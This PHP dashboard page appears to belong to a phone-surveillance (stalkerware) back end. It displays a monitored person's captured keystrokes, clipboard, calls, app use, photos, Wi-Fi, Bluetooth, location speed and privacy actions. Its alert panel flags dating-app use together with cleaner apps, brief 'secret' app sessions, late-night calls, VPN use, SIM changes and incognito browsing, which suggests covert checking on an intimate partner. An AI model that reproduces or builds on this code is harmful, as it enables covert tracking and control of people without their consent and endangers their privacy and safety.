<?php
require_once __DIR__ . '/_boot_viewer.php';

$uid = (int)($_GET['user'] ?? 0);
$day = (string)($_GET['day'] ?? date('Y-m-d'));
if (!preg_match('/^\d{4}-\d{2}-\d{2}$/', $day)) $day = date('Y-m-d');
$dq = $pdo->quote($day);
$section = trim($_GET['sec'] ?? '');

function evt_style($type) {
    return match($type) {
        'typing'       => ['⌨️', '#22c55e', 'Typing'],
        'screen'       => ['📄', '#60a5fa', 'Screen'],
        'click'        => ['👆', '#f59e0b', 'Click'],
        'scroll'       => ['📜', '#a855f7', 'Scroll'],
        'notif_dismiss'=> ['🔕', '#f87171', 'Notification'],
        'input_focus'  => ['🔤', '#06b6d4', 'Input Focus'],
        'clipboard'    => ['📋', '#ec4899', 'Clipboard'],
        'app_drawer'   => ['🏠', '#64748b', 'Home/Recents'],
        'recent_apps'  => ['🔄', '#64748b', 'Recent Apps'],
        default        => ['•', '#94a3b8', $type],
    };
}
function fmt_dur_s($s){ $h=intdiv($s,3600);$m=intdiv($s%3600,60);$x=$s%60; if($h>0)return "{$h}h {$m}m"; if($m>0)return "{$m}m {$x}s"; return "{$x}s"; }

$uw = $uid ? "AND user_id=$uid" : "";
$uwn = $uid ? "AND a.user_id=$uid" : "";

// 1. Screen unlock count
$unlocks = 0;
try {
    $r = $pdo->query("SELECT MAX(unlock_count) AS c FROM device_status WHERE 1=1 ".($uid?"AND user_id=$uid":""))->fetch();
    $unlocks = (int)($r['c'] ?? 0);
} catch (\Throwable $e) {}

// 2. App open count (from app_timeline)
$appOpens = [];
try {
    $appOpens = $pdo->query("SELECT app, COUNT(*) AS cnt FROM app_timeline WHERE DATE(started_at)=$dq $uw GROUP BY app ORDER BY cnt DESC LIMIT 20")->fetchAll();
} catch (\Throwable $e) {}
$totalOpens = array_sum(array_column($appOpens, 'cnt'));

// 3. First & Last app of the day
$firstApp = $lastApp = null;
try {
    $firstApp = $pdo->query("SELECT app, started_at FROM app_timeline WHERE DATE(started_at)=$dq $uw ORDER BY started_at ASC LIMIT 1")->fetch();
    $lastApp = $pdo->query("SELECT app, started_at FROM app_timeline WHERE DATE(started_at)=$dq $uw ORDER BY started_at DESC LIMIT 1")->fetch();
} catch (\Throwable $e) {}

// 4. Longest app session
$longestSession = null;
try {
    $longestSession = $pdo->query("SELECT app, started_at, ended_at, TIMESTAMPDIFF(SECOND, started_at, COALESCE(ended_at, NOW())) AS dur FROM app_timeline WHERE DATE(started_at)=$dq $uw AND ended_at IS NOT NULL ORDER BY dur DESC LIMIT 1")->fetch();
} catch (\Throwable $e) {}

// 5. App after App patterns (top 10 transitions)
$appTransitions = [];
try {
    $allApps = $pdo->query("SELECT app, started_at FROM app_timeline WHERE DATE(started_at)=$dq $uw ORDER BY started_at ASC")->fetchAll();
    $trans = [];
    for ($i = 1; $i < count($allApps); $i++) {
        $gap = strtotime($allApps[$i]['started_at']) - strtotime($allApps[$i-1]['started_at']);
        if ($gap < 120 && $allApps[$i]['app'] !== $allApps[$i-1]['app']) {
            $key = $allApps[$i-1]['app'] . ' → ' . $allApps[$i]['app'];
            $trans[$key] = ($trans[$key] ?? 0) + 1;
        }
    }
    arsort($trans);
    $appTransitions = array_slice($trans, 0, 10, true);
} catch (\Throwable $e) {}

// 6. Hourly heatmap (screen sessions)
$heatmap = array_fill(0, 24, 0);
try {
    $hrs = $pdo->query("SELECT HOUR(started_at) AS h, COUNT(*) AS c FROM screen_sessions WHERE DATE(started_at)=$dq $uw GROUP BY h")->fetchAll();
    foreach ($hrs as $h) $heatmap[(int)$h['h']] = (int)$h['c'];
} catch (\Throwable $e) {}

// 7. Night usage (12am-5am app usage)
$nightApps = [];
try {
    $nightApps = $pdo->query("SELECT app, COUNT(*) AS cnt, SUM(TIMESTAMPDIFF(SECOND, started_at, COALESCE(ended_at, started_at))) AS dur FROM app_timeline WHERE DATE(started_at)=$dq $uw AND HOUR(started_at) BETWEEN 0 AND 4 GROUP BY app ORDER BY dur DESC LIMIT 10")->fetchAll();
} catch (\Throwable $e) {}

// 8. Late night calls (12am-5am)
$nightCalls = [];
try {
    $nightCalls = $pdo->query("SELECT started_at, ended_at, label, call_type, TIMESTAMPDIFF(SECOND, started_at, COALESCE(ended_at, NOW())) AS dur FROM call_sessions WHERE DATE(started_at)=$dq $uw AND HOUR(started_at) BETWEEN 0 AND 4 ORDER BY started_at DESC")->fetchAll();
} catch (\Throwable $e) {}

// 9. Most contacted (from call_sessions)
$mostCalled = [];
try {
    $mostCalled = $pdo->query("SELECT label, call_type, COUNT(*) AS cnt, SUM(duration_sec) AS total_dur FROM call_sessions WHERE DATE(started_at)=$dq $uw AND label IS NOT NULL AND label != '' GROUP BY label ORDER BY cnt DESC LIMIT 10")->fetchAll();
} catch (\Throwable $e) {}

// 10. Suspicious: quick install+delete
$suspicious = [];
try {
    $sw2 = "changed_at > DATE_SUB(NOW(), INTERVAL 7 DAY)";
    if ($uid) $sw2 .= " AND user_id=$uid";
    $allChanges = $pdo->query("SELECT * FROM app_changes WHERE $sw2 ORDER BY changed_at ASC")->fetchAll();
    $installs = [];
    foreach ($allChanges as $ac) {
        $key = ($ac['user_id']??0) . '|' . $ac['package'];
        if ($ac['action'] === 'installed') { $installs[$key] = $ac; }
        elseif ($ac['action'] === 'uninstalled' && isset($installs[$key])) {
            $gap = strtotime($ac['changed_at']) - strtotime($installs[$key]['changed_at']);
            if ($gap > 0 && $gap < 21600) {
                $suspicious[] = ['pkg'=>$ac['package'], 'name'=>$installs[$key]['app_name']?:$ac['package'], 'installed'=>$installs[$key]['changed_at'], 'removed'=>$ac['changed_at'], 'gap_min'=>round($gap/60)];
            }
            unset($installs[$key]);
        }
    }
} catch (\Throwable $e) {}

// 11. Suspicious app combos (dating + cleaner in same day)
$suspiciousCombos = [];
try {
    $datingApps = ['tinder','bumble','hinge','badoo','happn','grindr','okcupid','tantan','aisle','truly','dating','hookup'];
    $cleanerApps = ['cleaner','clean','boost','optimizer','eraser','shredder','privacy','vault','hide','locker','calculator+','applock','safe'];
    $dayApps = $pdo->query("SELECT DISTINCT LOWER(app) AS app FROM app_timeline WHERE DATE(started_at)=$dq $uw")->fetchAll();
    $dayAppList = array_column($dayApps, 'app');
    $foundDating = []; $foundCleaner = [];
    foreach ($dayAppList as $a) {
        foreach ($datingApps as $d) { if (stripos($a, $d) !== false) $foundDating[] = $a; }
        foreach ($cleanerApps as $c) { if (stripos($a, $c) !== false) $foundCleaner[] = $a; }
    }
    if ($foundDating && $foundCleaner) $suspiciousCombos = ['dating' => $foundDating, 'cleaner' => $foundCleaner];
} catch (\Throwable $e) {}

// 12. Secret conversations (app opened < 30s, repeatedly)
$secretSessions = [];
try {
    $shortSessions = $pdo->query("SELECT app, COUNT(*) AS cnt FROM app_timeline WHERE DATE(started_at)=$dq $uw AND ended_at IS NOT NULL AND TIMESTAMPDIFF(SECOND, started_at, ended_at) < 30 GROUP BY app HAVING cnt >= 3 ORDER BY cnt DESC LIMIT 10")->fetchAll();
    $secretSessions = $shortSessions;
} catch (\Throwable $e) {}

// 13. Unknown number calls (call_sessions where label looks like a phone number)
$unknownCalls = [];
try {
    $unknownCalls = $pdo->query("SELECT started_at, label, call_type, duration_sec FROM call_sessions WHERE DATE(started_at)=$dq $uw AND label REGEXP '^[+0-9][0-9 ]{6,}$' ORDER BY started_at DESC LIMIT 20")->fetchAll();
} catch (\Throwable $e) {}

// 14. Usage pattern change (compare today vs 7-day avg)
$todayScreenTime = 0; $avgScreenTime = 0;
try {
    $ts = $pdo->query("SELECT SUM(GREATEST(0,TIMESTAMPDIFF(SECOND,started_at,COALESCE(ended_at,NOW())))) AS s FROM screen_sessions WHERE DATE(started_at)=$dq $uw")->fetch();
    $todayScreenTime = (int)($ts['s'] ?? 0);
    $av = $pdo->query("SELECT AVG(daily_total) AS a FROM (SELECT DATE(started_at) AS d, SUM(GREATEST(0,TIMESTAMPDIFF(SECOND,started_at,COALESCE(ended_at,started_at)))) AS daily_total FROM screen_sessions WHERE started_at >= DATE_SUB($dq, INTERVAL 7 DAY) AND DATE(started_at) < $dq $uw GROUP BY d) sub")->fetch();
    $avgScreenTime = (int)($av['a'] ?? 0);
} catch (\Throwable $e) {}

// 15. Contact added/deleted (from contacts table changes)
$contactChanges = [];
try {
    $contactChanges = $pdo->query("SELECT * FROM app_changes WHERE DATE(changed_at)=$dq $uw AND (package LIKE '%contact%' OR package LIKE '%phonebook%') ORDER BY changed_at DESC LIMIT 20")->fetchAll();
} catch (\Throwable $e) {}

// 16. Acc event stats
$accStats = [];
try {
    $sw = "DATE(event_at)=$dq";
    if ($uid) $sw .= " AND user_id=$uid";
    $sr = $pdo->query("SELECT event_type, COUNT(*) AS cnt FROM acc_events WHERE $sw GROUP BY event_type ORDER BY cnt DESC")->fetchAll();
    foreach ($sr as $s) $accStats[$s['event_type']] = (int)$s['cnt'];
} catch (\Throwable $e) {}

// 17. Acc events (filtered)
$typeFilter = trim($_GET['type'] ?? '');
$accRows = [];
try {
    $where = "DATE(event_at)=$dq";
    if ($uid) $where .= " AND user_id=$uid";
    if ($typeFilter !== '') $where .= " AND event_type=" . $pdo->quote($typeFilter);
    $accRows = $pdo->query("SELECT e.*, u.name AS uname FROM acc_events e JOIN users u ON u.id=e.user_id WHERE $where ORDER BY event_at DESC LIMIT 500")->fetchAll();
} catch (\Throwable $e) {}

// 18. Photos/videos, app changes, bluetooth
$mediaRows = [];
try { $mw = "DATE(captured_at)=$dq"; if ($uid) $mw .= " AND user_id=$uid";
    $mediaRows = $pdo->query("SELECT m.*, u.name AS uname FROM media_captures m JOIN users u ON u.id=m.user_id WHERE $mw ORDER BY captured_at DESC")->fetchAll();
} catch (\Throwable $e) {}
$totalPhotos = 0; $totalVideos = 0;
foreach ($mediaRows as $mr) { $totalPhotos += (int)$mr['photos']; $totalVideos += (int)$mr['videos']; }

$appChanges = [];
try { $aw = "DATE(changed_at)=$dq"; if ($uid) $aw .= " AND user_id=$uid";
    $appChanges = $pdo->query("SELECT a.*, u.name AS uname FROM app_changes a JOIN users u ON u.id=a.user_id WHERE $aw ORDER BY changed_at DESC")->fetchAll();
} catch (\Throwable $e) {}

$btRows = [];
try { $bw = "DATE(logged_at)=$dq"; if ($uid) $bw .= " AND user_id=$uid";
    $btRows = $pdo->query("SELECT b.*, u.name AS uname FROM bluetooth_log b JOIN users u ON u.id=b.user_id WHERE $bw ORDER BY logged_at DESC LIMIT 100")->fetchAll();
} catch (\Throwable $e) {}
$btSeen = []; $btUnique = [];
foreach ($btRows as $br) { $key = $br['user_id'].'|'.$br['devices']; if (isset($btSeen[$key])) continue; $btSeen[$key]=true; $btUnique[]=$br; }

$snapshots = [];
try { $snw = "DATE(snapped_at)=$dq"; if ($uid) $snw .= " AND user_id=$uid";
    $snapshots = $pdo->query("SELECT * FROM device_snapshots WHERE $snw ORDER BY snapped_at ASC")->fetchAll();
} catch (\Throwable $e) {}

$privacyEvents = [];
try { $pw = "DATE(event_at)=$dq"; if ($uid) $pw .= " AND user_id=$uid";
    $privacyEvents = $pdo->query("SELECT p.*, u.name AS uname FROM privacy_events p JOIN users u ON u.id=p.user_id WHERE $pw ORDER BY event_at DESC")->fetchAll();
} catch (\Throwable $e) {}

$wifiHist = [];
try { $ww = "DATE(last_seen)=$dq"; if ($uid) $ww .= " AND user_id=$uid";
    $wifiHist = $pdo->query("SELECT w.*, u.name AS uname FROM wifi_history w JOIN users u ON u.id=w.user_id WHERE $ww ORDER BY last_seen DESC")->fetchAll();
} catch (\Throwable $e) {}
$newWifis = array_filter($wifiHist, fn($w) => (int)$w['is_new'] === 1);

$contactLog = [];
try { $cw = "DATE(call_time)=$dq"; if ($uid) $cw .= " AND c.user_id=$uid";
    $contactLog = $pdo->query("SELECT c.*, u.name AS uname FROM contact_log c JOIN users u ON u.id=c.user_id WHERE $cw ORDER BY call_time DESC LIMIT 100")->fetchAll();
} catch (\Throwable $e) {}

$cloneApps = [];
try {
    $clonePatterns = ['parallel','dual','clone','multi','2accounts','second','space','island','shelter','app.cloner','multi.parallel','dualspace','dual_space'];
    $likeConditions = array_map(fn($p) => "LOWER(package) LIKE '%$p%' OR LOWER(app_name) LIKE '%$p%'", $clonePatterns);
    $cloneApps = $pdo->query("SELECT DISTINCT package, app_name FROM installed_apps WHERE (".implode(' OR ',$likeConditions).") ".($uid?"AND user_id=$uid":""))->fetchAll();
} catch (\Throwable $e) {}

$recorderApps = [];
try {
    $recPatterns = ['screen.record','screenrecord','recorder','screen.capture','screencapture','az.screen','mobizen','du.recorder','rec.screen','xrecorder'];
    $recLike = array_map(fn($p) => "LOWER(a.app) LIKE '%$p%'", $recPatterns);
    $recorderApps = $pdo->query("SELECT DISTINCT a.app FROM app_timeline a WHERE DATE(a.started_at)=$dq $uwn AND (".implode(' OR ',$recLike).")")->fetchAll();
} catch (\Throwable $e) {}

$incognitoHints = [];
try {
    $incognitoHints = $pdo->query("SELECT DISTINCT e.package, e.detail FROM acc_events e WHERE DATE(e.event_at)=$dq ".($uid?"AND e.user_id=$uid":"")." AND e.event_type='screen' AND (LOWER(e.detail) LIKE '%incognito%' OR LOWER(e.detail) LIKE '%private%' OR LOWER(e.detail) LIKE '%inprivate%')")->fetchAll();
} catch (\Throwable $e) {}

$speedData = [];
try {
    $speedData = $pdo->query("SELECT recorded_at, speed, accuracy FROM locations WHERE DATE(recorded_at)=$dq ".($uid?"AND user_id=$uid":"")." AND speed IS NOT NULL AND speed > 0 ORDER BY recorded_at DESC LIMIT 50")->fetchAll();
} catch (\Throwable $e) {}

$PAGE_TITLE = 'Deep Monitor';
$PAGE_SUB   = 'Complete behavioral analytics — typing, clicks, patterns, alerts, device state';
$PAGE_ICON  = '👁️';

$PAGE_TOOLS = '<form method="get" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">'
    . '<input type="hidden" name="user" value="'.$uid.'">'
    . '<input class="sel" type="date" name="day" value="'.ss_admin_h($day).'" max="'.date('Y-m-d').'" min="'.date('Y-m-d', strtotime('-7 days')).'" onchange="this.form.submit()">'
    . '</form>';

require __DIR__ . '/_head_viewer.php';
?>

<!-- ═══════════════ SMART ALERTS ═══════════════ -->
<?php
$hasVpn = array_filter($privacyEvents, fn($e) => $e['event_type'] === 'vpn_on');
$hasSimChange = array_filter($privacyEvents, fn($e) => $e['event_type'] === 'sim_change');
$hasScreenshots = array_filter($privacyEvents, fn($e) => $e['event_type'] === 'screenshot');
$hasAlerts = !empty($suspicious) || !empty($suspiciousCombos) || !empty($secretSessions) || !empty($unknownCalls) || !empty($nightCalls) || !empty($hasVpn) || !empty($hasSimChange) || !empty($cloneApps) || !empty($recorderApps) || !empty($incognitoHints) || ($todayScreenTime > 0 && $avgScreenTime > 0 && $todayScreenTime > $avgScreenTime * 1.5);
if ($hasAlerts): ?>
<div class="panel" style="border:1px solid rgba(239,68,68,.3)">
  <h3>🚨 Smart Alerts</h3>

  <?php if ($todayScreenTime > 0 && $avgScreenTime > 0 && $todayScreenTime > $avgScreenTime * 1.5): ?>
    <div style="padding:8px 12px;background:rgba(249,115,22,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#fb923c">📈 Usage Spike</b> — Today <?= fmt_dur_s($todayScreenTime) ?> vs 7-day avg <?= fmt_dur_s($avgScreenTime) ?> (<?= round($todayScreenTime/$avgScreenTime*100) ?>%)
    </div>
  <?php endif; ?>

  <?php if ($suspicious): ?>
    <div style="padding:8px 12px;background:rgba(239,68,68,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#f87171">🗑️ Quick Install & Delete (7 days)</b>
      <div style="overflow-x:auto;margin-top:6px"><table>
        <thead><tr><th>App</th><th>Installed</th><th>Removed</th><th>Lived</th></tr></thead>
        <tbody>
        <?php foreach($suspicious as $s): ?>
          <tr style="color:#f87171">
            <td><b><?= ss_admin_h($s['name']) ?></b><br><span style="font-size:.68rem;color:var(--mut)"><?= ss_admin_h($s['pkg']) ?></span></td>
            <td style="white-space:nowrap"><?= date('d M H:i', strtotime($s['installed'])) ?></td>
            <td style="white-space:nowrap"><?= date('d M H:i', strtotime($s['removed'])) ?></td>
            <td><span class="pill" style="background:rgba(239,68,68,.15);color:#f87171"><?= $s['gap_min'] ?>m</span></td>
          </tr>
        <?php endforeach; ?>
        </tbody>
      </table></div>
    </div>
  <?php endif; ?>

  <?php if ($suspiciousCombos): ?>
    <div style="padding:8px 12px;background:rgba(239,68,68,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#f87171">💔 Suspicious App Combo</b> — Dating + Cleaner apps used same day<br>
      <span style="color:#fb923c">Dating:</span> <?php foreach($suspiciousCombos['dating'] as $d) echo '<span class="pill" style="background:rgba(239,68,68,.15);color:#f87171;font-size:.7rem">'.ss_admin_h($d).'</span> '; ?>
      <span style="color:#fb923c">Cleaner:</span> <?php foreach($suspiciousCombos['cleaner'] as $c) echo '<span class="pill" style="background:rgba(249,115,22,.15);color:#fb923c;font-size:.7rem">'.ss_admin_h($c).'</span> '; ?>
    </div>
  <?php endif; ?>

  <?php if ($secretSessions): ?>
    <div style="padding:8px 12px;background:rgba(168,85,247,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#c084fc">👻 Secret Sessions</b> — Apps opened & closed in <30s (3+ times)
      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">
      <?php foreach($secretSessions as $ss): ?>
        <span class="pill" style="background:rgba(168,85,247,.15);color:#c084fc"><?= ss_admin_h($ss['app']) ?> · <?= (int)$ss['cnt'] ?>× quick open</span>
      <?php endforeach; ?>
      </div>
    </div>
  <?php endif; ?>

  <?php if ($unknownCalls): ?>
    <div style="padding:8px 12px;background:rgba(59,130,246,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#60a5fa">📞 Unknown Numbers</b> — Calls from unsaved numbers
      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">
      <?php foreach($unknownCalls as $uc): ?>
        <span class="pill" style="background:rgba(59,130,246,.15);color:#60a5fa;font-size:.7rem"><?= ss_admin_h($uc['label']) ?> · <?= date('H:i', strtotime($uc['started_at'])) ?> · <?= ss_admin_h($uc['call_type'] ?: '?') ?></span>
      <?php endforeach; ?>
      </div>
    </div>
  <?php endif; ?>

  <?php if ($nightCalls): ?>
    <div style="padding:8px 12px;background:rgba(249,115,22,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#fb923c">🌙 Late Night Calls (12am–5am)</b>
      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">
      <?php foreach($nightCalls as $nc): ?>
        <span class="pill" style="background:rgba(249,115,22,.15);color:#fb923c;font-size:.7rem"><?= ss_admin_h($nc['label'] ?: '📞') ?> · <?= date('H:i', strtotime($nc['started_at'])) ?> · <?= fmt_dur_s((int)($nc['dur'] ?? 0)) ?></span>
      <?php endforeach; ?>
      </div>
    </div>
  <?php endif; ?>

  <?php if ($hasVpn): ?>
    <div style="padding:8px 12px;background:rgba(239,68,68,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#f87171">🛡️ VPN Usage Detected</b> — <?= count($hasVpn) ?> session(s) today
      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">
      <?php foreach($hasVpn as $ve): ?>
        <span class="pill" style="background:rgba(239,68,68,.15);color:#f87171;font-size:.7rem"><?= date('H:i', strtotime($ve['event_at'])) ?></span>
      <?php endforeach; ?>
      </div>
    </div>
  <?php endif; ?>

  <?php if ($hasSimChange): ?>
    <div style="padding:8px 12px;background:rgba(239,68,68,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#f87171">🔄 SIM Card Changed!</b>
      <?php foreach($hasSimChange as $sc): ?>
        <div style="color:var(--mut);font-size:.8rem"><?= date('H:i', strtotime($sc['event_at'])) ?> — <?= ss_admin_h($sc['detail']) ?></div>
      <?php endforeach; ?>
    </div>
  <?php endif; ?>

  <?php if ($cloneApps): ?>
    <div style="padding:8px 12px;background:rgba(239,68,68,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#f87171">👥 Dual/Clone Apps Detected</b> — Second space or app cloner installed
      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">
      <?php foreach($cloneApps as $ca): ?>
        <span class="pill" style="background:rgba(239,68,68,.15);color:#f87171;font-size:.7rem"><?= ss_admin_h($ca['app_name'] ?: $ca['package']) ?></span>
      <?php endforeach; ?>
      </div>
    </div>
  <?php endif; ?>

  <?php if ($recorderApps): ?>
    <div style="padding:8px 12px;background:rgba(168,85,247,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#c084fc">🎥 Screen Recording App Used</b>
      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">
      <?php foreach($recorderApps as $ra): ?>
        <span class="pill" style="background:rgba(168,85,247,.15);color:#c084fc;font-size:.7rem"><?= ss_admin_h($ra['app']) ?></span>
      <?php endforeach; ?>
      </div>
    </div>
  <?php endif; ?>

  <?php if ($incognitoHints): ?>
    <div style="padding:8px 12px;background:rgba(249,115,22,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#fb923c">🕵️ Private/Incognito Browsing Detected</b>
      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">
      <?php foreach($incognitoHints as $ih): ?>
        <span class="pill" style="background:rgba(249,115,22,.15);color:#fb923c;font-size:.7rem"><?= ss_admin_h($ih['package']) ?> — <?= ss_admin_h($ih['detail']) ?></span>
      <?php endforeach; ?>
      </div>
    </div>
  <?php endif; ?>

  <?php if ($hasScreenshots): ?>
    <div style="padding:8px 12px;background:rgba(59,130,246,.08);border-radius:8px;margin-bottom:8px">
      <b style="color:#60a5fa">📸 Screenshots Taken</b> — <?= count($hasScreenshots) ?> time(s)
      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">
      <?php foreach($hasScreenshots as $ss): ?>
        <span class="pill" style="background:rgba(59,130,246,.15);color:#60a5fa;font-size:.7rem"><?= date('H:i', strtotime($ss['event_at'])) ?> · <?= ss_admin_h($ss['detail']) ?></span>
      <?php endforeach; ?>
      </div>
    </div>
  <?php endif; ?>
</div>
<?php endif; ?>

<!-- ═══════════════ BEHAVIORAL OVERVIEW ═══════════════ -->
<div class="cards">
  <div class="stat"><div class="h"><span class="dot">🔓</span> Unlocks Today</div><div class="v"><?= $unlocks ?></div></div>
  <div class="stat"><div class="h"><span class="dot">📱</span> App Opens</div><div class="v"><?= $totalOpens ?></div></div>
  <div class="stat"><div class="h"><span class="dot">📸</span> Photos / Videos</div><div class="v"><?= $totalPhotos ?> / <?= $totalVideos ?></div></div>
  <div class="stat"><div class="h"><span class="dot">⏱️</span> Screen Time</div><div class="v" style="font-size:1.2rem"><?= $todayScreenTime ? fmt_dur_s($todayScreenTime) : '—' ?></div></div>
</div>

<!-- ═══════════════ FIRST & LAST + LONGEST ═══════════════ -->
<div class="panel">
  <h3>🎯 Day Highlights — <?= ss_admin_h(date('d M Y', strtotime($day))) ?></h3>
  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px">
    <div>
      <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;margin-bottom:4px">🌅 First App</div>
      <?php if($firstApp): ?>
        <b><?= ss_admin_h($firstApp['app']) ?></b> <span style="color:var(--mut);font-size:.8rem"><?= date('H:i', strtotime($firstApp['started_at'])) ?></span>
      <?php else: ?><span style="color:var(--mut)">—</span><?php endif; ?>
    </div>
    <div>
      <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;margin-bottom:4px">🌙 Last App</div>
      <?php if($lastApp): ?>
        <b><?= ss_admin_h($lastApp['app']) ?></b> <span style="color:var(--mut);font-size:.8rem"><?= date('H:i', strtotime($lastApp['started_at'])) ?></span>
      <?php else: ?><span style="color:var(--mut)">—</span><?php endif; ?>
    </div>
    <div>
      <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;margin-bottom:4px">🏆 Longest Session</div>
      <?php if($longestSession): ?>
        <b><?= ss_admin_h($longestSession['app']) ?></b> <span class="pill" style="background:rgba(34,197,94,.15);color:#4ade80"><?= fmt_dur_s((int)$longestSession['dur']) ?></span>
      <?php else: ?><span style="color:var(--mut)">—</span><?php endif; ?>
    </div>
    <div>
      <div style="color:var(--mut);font-size:.68rem;text-transform:uppercase;margin-bottom:4px">📊 7-Day Avg Screen</div>
      <span style="color:var(--mut)"><?= $avgScreenTime ? fmt_dur_s($avgScreenTime) : '—' ?></span>
    </div>
  </div>
</div>

<!-- ═══════════════ APP OPEN COUNT ═══════════════ -->
<?php if($appOpens): ?>
<div class="panel">
  <h3>📱 App Open Count — <?= ss_admin_h(date('d M Y', strtotime($day))) ?></h3>
  <div style="display:flex;flex-wrap:wrap;gap:8px">
    <?php foreach($appOpens as $ao):
        $short = preg_replace('/^com\.([\w]+\.)?/', '', $ao['app']);
    ?>
      <span class="pill" style="background:rgba(99,102,241,.15);color:#818cf8"><b><?= ss_admin_h($short) ?></b> · <?= (int)$ao['cnt'] ?>×</span>
    <?php endforeach; ?>
  </div>
</div>
<?php endif; ?>

<!-- ═══════════════ APP → APP PATTERNS ═══════════════ -->
<?php if($appTransitions): ?>
<div class="panel">
  <h3>🔀 App Switch Patterns</h3>
  <div style="font-size:.75rem;color:var(--mut);margin-bottom:8px">Which app was opened right after which — reveals habits</div>
  <div style="display:flex;flex-wrap:wrap;gap:8px">
    <?php foreach($appTransitions as $t=>$cnt):
        $parts = explode(' → ', $t);
        $from = preg_replace('/^com\.([\w]+\.)?/', '', $parts[0] ?? '');
        $to = preg_replace('/^com\.([\w]+\.)?/', '', $parts[1] ?? '');
    ?>
      <span class="pill" style="background:rgba(236,72,153,.12);color:#f472b6;font-size:.75rem"><?= ss_admin_h($from) ?> → <?= ss_admin_h($to) ?> · <?= $cnt ?>×</span>
    <?php endforeach; ?>
  </div>
</div>
<?php endif; ?>

<!-- ═══════════════ SCREEN TIME HEATMAP ═══════════════ -->
<div class="panel">
  <h3>🔥 Hourly Activity Heatmap</h3>
  <div style="display:flex;gap:2px;flex-wrap:wrap;margin-top:8px">
    <?php $maxH = max(1, max($heatmap)); for($h=0;$h<24;$h++):
        $v = $heatmap[$h]; $intensity = $v / $maxH;
        $bg = $v === 0 ? 'rgba(100,116,139,.1)' : 'rgba(34,197,94,'.round($intensity*0.6+0.1,2).')';
    ?>
      <div style="text-align:center;min-width:28px">
        <div style="width:28px;height:28px;border-radius:4px;background:<?= $bg ?>;display:flex;align-items:center;justify-content:center;font-size:.6rem;color:<?= $v>0?'#fff':'var(--mut)' ?>"><?= $v ?></div>
        <div style="font-size:.55rem;color:var(--mut);margin-top:2px"><?= str_pad($h,2,'0',STR_PAD_LEFT) ?></div>
      </div>
    <?php endfor; ?>
  </div>
  <div style="font-size:.65rem;color:var(--mut);margin-top:6px">Number of screen-on events per hour. Darker green = more active.</div>
</div>

<!-- ═══════════════ NIGHT OWL ═══════════════ -->
<?php if($nightApps): ?>
<div class="panel" style="border:1px solid rgba(249,115,22,.2)">
  <h3>🦉 Night Owl (12am – 5am)</h3>
  <div style="overflow-x:auto"><table>
    <thead><tr><th>App</th><th>Opens</th><th>Duration</th></tr></thead>
    <tbody>
    <?php foreach($nightApps as $na): ?>
      <tr>
        <td><b><?= ss_admin_h($na['app']) ?></b></td>
        <td><?= (int)$na['cnt'] ?>×</td>
        <td><?= fmt_dur_s((int)($na['dur'] ?? 0)) ?></td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table></div>
</div>
<?php endif; ?>

<!-- ═══════════════ MOST CONTACTED ═══════════════ -->
<?php if($mostCalled): ?>
<div class="panel">
  <h3>📞 Most Contacted</h3>
  <div style="overflow-x:auto"><table>
    <thead><tr><th>Contact</th><th>Calls</th><th>Total Duration</th></tr></thead>
    <tbody>
    <?php foreach($mostCalled as $mc): ?>
      <tr>
        <td><b><?= ss_admin_h($mc['label']) ?></b></td>
        <td><?= (int)$mc['cnt'] ?>×</td>
        <td><?= fmt_dur_s((int)($mc['total_dur'] ?? 0)) ?></td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table></div>
</div>
<?php endif; ?>

<!-- ═══════════════ DEVICE STATE ═══════════════ -->
<?php if($snapshots): ?>
<div class="panel">
  <h3>🔊 Device State Changes</h3>
  <div style="font-size:.75rem;color:var(--mut);margin-bottom:8px">Volume, brightness, ringer mode over time</div>
  <?php
  $prevRinger = ''; $prevVol = -1; $prevBright = -1;
  $changes = [];
  foreach ($snapshots as $sn) {
      $ch = [];
      if ($sn['ringer_mode'] && $sn['ringer_mode'] !== $prevRinger) { $ch[] = 'Ringer → '.ucfirst($sn['ringer_mode']); $prevRinger = $sn['ringer_mode']; }
      if ($sn['media_vol'] !== null && (int)$sn['media_vol'] !== $prevVol) { $ch[] = 'Volume → '.$sn['media_vol']; $prevVol = (int)$sn['media_vol']; }
      if ($sn['brightness'] !== null && abs((int)$sn['brightness'] - $prevBright) > 20) { $ch[] = 'Brightness → '.$sn['brightness']; $prevBright = (int)$sn['brightness']; }
      if ($ch) $changes[] = ['time' => $sn['snapped_at'], 'changes' => $ch];
  }
  if ($changes): ?>
    <div style="overflow-x:auto;max-height:300px;overflow-y:auto"><table>
      <thead><tr><th>Time</th><th>Changes</th></tr></thead>
      <tbody>
      <?php foreach(array_reverse($changes) as $ch): ?>
        <tr>
          <td style="white-space:nowrap"><?= date('H:i', strtotime($ch['time'])) ?></td>
          <td><?php foreach($ch['changes'] as $c): ?>
            <span class="pill" style="background:rgba(99,102,241,.15);color:#818cf8;font-size:.7rem"><?= ss_admin_h($c) ?></span>
          <?php endforeach; ?></td>
        </tr>
      <?php endforeach; ?>
      </tbody>
    </table></div>
  <?php else: ?>
    <div class="empty">No significant changes detected today.</div>
  <?php endif; ?>
</div>
<?php endif; ?>

